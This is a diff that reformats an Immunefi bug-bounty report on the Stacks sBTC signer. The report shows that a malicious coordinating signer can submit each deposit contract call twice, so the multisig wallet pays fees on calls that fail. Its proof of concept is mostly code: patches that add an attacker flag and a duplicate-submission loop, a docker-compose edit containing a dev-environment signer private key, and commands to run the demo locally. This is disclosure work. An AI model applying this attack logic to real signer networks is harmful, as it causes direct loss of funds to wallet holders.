@@ -1,11 +1,11 @@
-# #38398 \[BC-High] Malicious Signers can initiate repeated contract calls to cause the multi-sign wallet to lose tx fee
+# #38398 \[BC-High] Malicious Signers can initiate repeated contract calls to cause the multi-sign wall
 
 **Submitted on Jan 2nd 2025 at 13:36:39 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)
 
 * **Report ID:** #38398
 * **Report Type:** Blockchain/DLT
 * **Report severity:** High
-* **Target:** https://github.com/stacks-network/sbtc/tree/immunefi\_attackaton\_0.9/signer
+* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
 * **Impacts:**
   * Direct loss of funds
 
@@ -90,138 +90,138 @@ The signer should check the coordinator's call request to ensure it is not a cal
 
 ## Proof of Concept
 
-1. Base on: https://github.com/stacks-network/sbtc/releases/tag/0.0.9-rc4
-2.  Patch `signer/src/config/mod.rs`, add attacker flag config
+1. Base on: <https://github.com/stacks-network/sbtc/releases/tag/0.0.9-rc4>
+2. Patch `signer/src/config/mod.rs`, add attacker flag config
 
-    ```diff
-         /// The minimum bitcoin block height for which the sbtc signers will
-         /// backfill bitcoin blocks to.
-         pub sbtc_bitcoin_start_height: Option<u64>,
-    +    /// @audit;
-    +    pub audit_this_signer_is_attacker: Option<bool>,
-     }
-     
-     impl Validatable for SignerConfig {
-    ```
-3.  Patch `signer/src/main.rs`, load attacker flag
+   ```diff
+        /// The minimum bitcoin block height for which the sbtc signers will
+        /// backfill bitcoin blocks to.
+        pub sbtc_bitcoin_start_height: Option<u64>,
+   +    /// @audit;
+   +    pub audit_this_signer_is_attacker: Option<bool>,
+    }
+    
+    impl Validatable for SignerConfig {
+   ```
+3. Patch `signer/src/main.rs`, load attacker flag
 
-    ```diff
-         );
-     
-         // Load the configuration file and/or environment variables.
-    -    let settings = Settings::new(args.config)?;
-    +    let mut settings = Settings::new(args.config)?;
-    +    std::thread::sleep(std::time::Duration::from_millis(2000)); // wait for the `docker logs` command
-    +    settings.signer.audit_this_signer_is_attacker = match std::env::var("AUDIT_THIS_SIGNER_IS_ATTACKER") {
-    +        Ok(value) => Some(value.parse::<bool>().unwrap()),
-    +        _ => Some(false),
-    +    };
-    +    tracing::info!("@audit; audit_this_signer_is_attacker: {:?}", settings.signer.audit_this_signer_is_attacker);
-         signer::metrics::setup_metrics(settings.signer.prometheus_exporter_endpoint);
-     
-         // Open a connection to the signer db.
-    ```
-4.  Patch `docker/docker-compose.yml`, add attacker flag
+   ```diff
+        );
+    
+        // Load the configuration file and/or environment variables.
+   -    let settings = Settings::new(args.config)?;
+   +    let mut settings = Settings::new(args.config)?;
+   +    std::thread::sleep(std::time::Duration::from_millis(2000)); // wait for the `docker logs` command
+   +    settings.signer.audit_this_signer_is_attacker = match std::env::var("AUDIT_THIS_SIGNER_IS_ATTACKER") {
+   +        Ok(value) => Some(value.parse::<bool>().unwrap()),
+   +        _ => Some(false),
+   +    };
+   +    tracing::info!("@audit; audit_this_signer_is_attacker: {:?}", settings.signer.audit_this_signer_is_attacker);
+        signer::metrics::setup_metrics(settings.signer.prometheus_exporter_endpoint);
+    
+        // Open a connection to the signer db.
+   ```
+4. Patch `docker/docker-compose.yml`, add attacker flag
 
-    ```diff
-           - postgres-3
-         environment:
-           <<: *sbtc-signer-environment
-    +      AUDIT_THIS_SIGNER_IS_ATTACKER: true
-           SIGNER_SIGNER__DB_ENDPOINT: postgresql://postgres:postgres@postgres-3:5432/signer
-           SIGNER_SIGNER__PRIVATE_KEY: 3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401
-           SIGNER_SIGNER__P2P__SEEDS: tcp://sbtc-signer-1:4122,tcp://sbtc-signer-2:4122
-    ```
-5.  Patch `signer/src/transaction_coordinator.rs`, add attack action
+   ```diff
+          - postgres-3
+        environment:
+          <<: *sbtc-signer-environment
+   +      AUDIT_THIS_SIGNER_IS_ATTACKER: true
+          SIGNER_SIGNER__DB_ENDPOINT: postgresql://postgres:postgres@postgres-3:5432/signer
+          SIGNER_SIGNER__PRIVATE_KEY: 3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401
+          SIGNER_SIGNER__P2P__SEEDS: tcp://sbtc-signer-1:4122,tcp://sbtc-signer-2:4122
+   ```
+5. Patch `signer/src/transaction_coordinator.rs`, add attack action
 
-    ```diff
-              if deposit_requests.is_empty() {
-                  tracing::debug!("no stacks transactions to create, exiting");
-                  return Ok(());
-              }
-     
-              tracing::debug!(
-                  num_deposits = %deposit_requests.len(),
-                  "we have deposit requests that have been swept that may need minting"
-              );
-              // We need to know the nonce to use, so we reach out to our stacks
-              // node for the account information for our multi-sig address.
-              //
-              // Note that the wallet object will automatically increment the
-              // nonce for each transaction that it creates.
-              let account = stacks.get_account(wallet.address()).await?;
-              wallet.set_nonce(account.nonce);
-     +        // @audit; start
-     +        tracing::info!("@audit; repeated sumbit start");
-     +        for req in deposit_requests.clone() {
-     +            let outpoint = req.deposit_outpoint();
-     +            let sign_request_fut =
-     +                self.construct_deposit_stacks_sign_request(req, bitcoin_aggregate_key, &wallet);
-     +
-     +            let (sign_request, multi_tx) = match sign_request_fut.await {
-     +                Ok(res) => res,
-     +                Err(error) => {
-     +                    tracing::error!(%error, "could not construct a transaction completing the deposit request");
-     +                    continue;
-     +                }
-     +            };
-     +
-     +            // If we fail to sign the transaction for some reason, we
-     +            // decrement the nonce by one, and try the next transaction.
-     +            // This is not a fatal error, since we could fail to sign the
-     +            // transaction because someone else is now the coordinator, and
-     +            // all the signers are now ignoring us.
-     +            let process_request_fut =
-     +                self.process_sign_request(sign_request, chain_tip, multi_tx, &wallet);
-     +
-     +            let status = match process_request_fut.await {
-     +                Ok(txid) => {
-     +                    tracing::info!(%txid, "successfully submitted complete-deposit transaction");
-     +                    "success"
-     +                }
-     +                Err(error) => {
-     +                    tracing::warn!(
-     +                        %error,
-     +                        txid = %outpoint.txid,
-     +                        vout = %outpoint.vout,
-     +                        "could not process the stacks sign request for a deposit"
-     +                    );
-     +                    tracing::info!(
-     +                        %error,
-     +                        txid = %outpoint.txid,
-     +                        vout = %outpoint.vout,
-     +                        "@audit; could not process the stacks sign request for a deposit"
-     +                    );
-     +                    wallet.set_nonce(wallet.get_nonce().saturating_sub(1));
-     +                    "failure"
-     +                }
-     +            };
-     +
-     +            metrics::counter!(
-     +                Metrics::TransactionsSubmittedTotal,
-     +                "blockchain" => STACKS_BLOCKCHAIN,
-     +                "status" => status,
-     +            )
-     +            .increment(1);
-     +        }
-     +        tracing::info!("@audit; repeated sumbit end");
-     +        // @audit; end
-     
-              for req in deposit_requests {
-                  let outpoint = req.deposit_outpoint();
-    ```
-6.  Run docker
+   ```diff
+             if deposit_requests.is_empty() {
+                 tracing::debug!("no stacks transactions to create, exiting");
+                 return Ok(());
+             }
+    
+             tracing::debug!(
+                 num_deposits = %deposit_requests.len(),
+                 "we have deposit requests that have been swept that may need minting"
+             );
+             // We need to know the nonce to use, so we reach out to our stacks
+             // node for the account information for our multi-sig address.
+             //
+             // Note that the wallet object will automatically increment the
+             // nonce for each transaction that it creates.
+             let account = stacks.get_account(wallet.address()).await?;
+             wallet.set_nonce(account.nonce);
+    +        // @audit; start
+    +        tracing::info!("@audit; repeated sumbit start");
+    +        for req in deposit_requests.clone() {
+    +            let outpoint = req.deposit_outpoint();
+    +            let sign_request_fut =
+    +                self.construct_deposit_stacks_sign_request(req, bitcoin_aggregate_key, &wallet);
+    +
+    +            let (sign_request, multi_tx) = match sign_request_fut.await {
+    +                Ok(res) => res,
+    +                Err(error) => {
+    +                    tracing::error!(%error, "could not construct a transaction completing the deposit request");
+    +                    continue;
+    +                }
+    +            };
+    +
+    +            // If we fail to sign the transaction for some reason, we
+    +            // decrement the nonce by one, and try the next transaction.
+    +            // This is not a fatal error, since we could fail to sign the
+    +            // transaction because someone else is now the coordinator, and
+    +            // all the signers are now ignoring us.
+    +            let process_request_fut =
+    +                self.process_sign_request(sign_request, chain_tip, multi_tx, &wallet);
+    +
+    +            let status = match process_request_fut.await {
+    +                Ok(txid) => {
+    +                    tracing::info!(%txid, "successfully submitted complete-deposit transaction");
+    +                    "success"
+    +                }
+    +                Err(error) => {
+    +                    tracing::warn!(
+    +                        %error,
+    +                        txid = %outpoint.txid,
+    +                        vout = %outpoint.vout,
+    +                        "could not process the stacks sign request for a deposit"
+    +                    );
+    +                    tracing::info!(
+    +                        %error,
+    +                        txid = %outpoint.txid,
+    +                        vout = %outpoint.vout,
+    +                        "@audit; could not process the stacks sign request for a deposit"
+    +                    );
+    +                    wallet.set_nonce(wallet.get_nonce().saturating_sub(1));
+    +                    "failure"
+    +                }
+    +            };
+    +
+    +            metrics::counter!(
+    +                Metrics::TransactionsSubmittedTotal,
+    +                "blockchain" => STACKS_BLOCKCHAIN,
+    +                "status" => status,
+    +            )
+    +            .increment(1);
+    +        }
+    +        tracing::info!("@audit; repeated sumbit end");
+    +        // @audit; end
+    
+             for req in deposit_requests {
+                 let outpoint = req.deposit_outpoint();
+   ```
+6. Run docker
 
-    ```sh
-    make devenv-up
-    make devenv-down
-    docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
-    make devenv-up
-    ```
-7. This PoC sets _sbtc-signer-3_ as an attacker, which will automatically attack if it is the coordinator. It executes each contract call twice to simulate the attack scenario.
-8.  Keep running the demo until the trigger the coordinator is _sbtc-signer-3_.
+   ```sh
+   make devenv-up
+   make devenv-down
+   docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
+   make devenv-up
+   ```
+7. This PoC sets *sbtc-signer-3* as an attacker, which will automatically attack if it is the coordinator. It executes each contract call twice to simulate the attack scenario.
+8. Keep running the demo until the trigger the coordinator is *sbtc-signer-3*.
 
-    ```sh
-    ./signers.sh demo
-    ```
-9. Track the transaction initiated by _sbtc-signer-3_ on [explorer](https://explorer.hiro.so/address/SN3R84XZYA63QS28932XQF3G1J8R9PC3W76P9CSQS?chain=testnet\&api=http://localhost:3999), and you will find some contract calls that fail but still consume execution fees.
+   ```sh
+   ./signers.sh demo
+   ```
+9. Track the transaction initiated by *sbtc-signer-3* on [explorer](https://explorer.hiro.so/address/SN3R84XZYA63QS28932XQF3G1J8R9PC3W76P9CSQS?chain=testnet\&api=http://localhost:3999), and you will find some contract calls that fail but still consume execution fees.
